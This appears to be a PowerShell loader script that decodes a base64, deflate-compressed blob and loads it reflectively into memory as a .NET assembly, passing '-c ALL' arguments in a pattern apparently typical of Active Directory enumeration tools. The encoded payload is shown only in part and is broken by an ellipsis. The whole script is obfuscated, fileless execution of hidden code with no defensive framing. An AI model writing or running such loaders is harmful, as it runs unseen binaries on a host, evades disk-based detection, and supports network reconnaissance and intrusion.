$EncodedCompressedFile = 'zL0HfBTF+we8t3e3V5KQXC65CyEkoSQsuQSkCEnovYN0kBJ6h4U7+uUCAkqRjiBFaUoT6dIFVMBCU7AgYIIioggoGkQRCO88z8y2JIT4+/zfz/vy4bI735l9npl55nnmmbbb5sW
...
rdSKYCZKT8nZyOBIKGZbqlJMpK1AaXTR27LKvqXNYQL8W9o0U7cV1sn/8/s9/JKLBU1cHtm+YMz/+f1/8Pd/AQ=='
$vars = New-Object System.Collections.Generic.List[System.Object]
$vars.add("-c")
$vars.add("ALL")
$passed = [string[]]$vars.ToArray()
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](1342464)
$DeflatedStream.Read($UncompressedFileBytes, 0, 1342464) | Out-Null
$Assembly = [Reflection.Assembly]::Load($UncompressedFileBytes)
$BindingFlags = [Reflection.BindingFlags] "Public,Static"
$a = @()
$Assembly.GetType("Costura.AssemblyLoader", $false).GetMethod("Attach", $BindingFlags).Invoke($Null, @())
